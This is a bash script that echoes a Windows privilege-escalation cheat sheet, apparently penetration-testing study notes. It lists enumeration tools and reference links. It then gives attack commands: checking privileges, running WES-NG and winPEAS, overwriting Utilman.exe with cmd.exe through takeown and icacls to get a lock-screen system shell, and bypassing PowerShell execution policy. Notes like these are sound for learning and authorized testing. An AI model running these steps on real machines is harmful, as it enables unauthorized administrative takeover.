#!/bin/bash

echo ""
echo "Privilege Escalation for Windows"
echo ""
echo "	(0) Tools"
echo "		wmic"
echo "		Winpeas: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS"
echo "		WES-NG (Windows Exploit Suggester): https://github.com/bitsadmin/wesng"
echo ""
echo "	(00) Websites"
echo "		PrivescCheck: https://github.com/itm4n/PrivescCheck"
echo "		Priv2Admin: https://github.com/gtworek/Priv2Admin"
echo "		PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md"
echo "		HackTricks: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation"
echo ""

echo "	(000) Additional Websites"
echo "		https://github.com/antonioCoco/RogueWinRM"
echo "		https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html"
echo "		https://decoder.cloud/"
echo "		https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf"

echo "	(General)"
echo "		See which priviliges you have"
echo "			whoami /priv"
echo ""
echo "	(1) Use WES-NG"
echo "		1.1) Run update for WES"
echo "			wes.py --update"
echo "		1.2) Run systeminfo on target system. Output to txt file."
echo "			wes.py systeminfo.txt"
echo "		1.3) Transfer systeminfo.txt to your attacker machine"
echo ""
echo "	(2) Use winpeas"
echo "		winpeas.py"
echo ""
echo "	(3) SeBackup/SeRestore"
echo "		The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges."
echo ""
echo "		Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash."
echo ""
echo "		3.1) Take ownership of an exe file using takeown"
echo "			takeown /f <path-to-file>"
echo "				Example: takeown /f C:\Windows\System32\Utilman.exe"
echo "				Utilman is for Ease of Access during lock screen"
echo ""
echo "		3.2) Change ownership of the file"
echo "			icacls <path-to-file> /grant <user>:F"
echo "				Example: icacls C:\Windows\System32\Utilman.exe"
echo ""
echo "		3.3) Replace the file with a copy of cmd.exe"
echo "			copy cmd.exe <path-to-file>"
echo "				Example: copy cmd.exe C:\Windows\System32\Utilman.exe"
echo ""
echo "		3.4) Lock screen and click Ease of Access. cmd should pop up."
echo ""
echo "	(4) Run PrivescCheck"
echo "		4.1) Bypass, if you have to, execution polycy restrictions"
echo "			SetExecutionPolicy Bypass -Scope process -Force"
echo "			..\PrivEscCheck.ps1"
echo "			Invoke-PrivescCheck"
echo "		4.2) If not necessary, just run PrivescCheck"











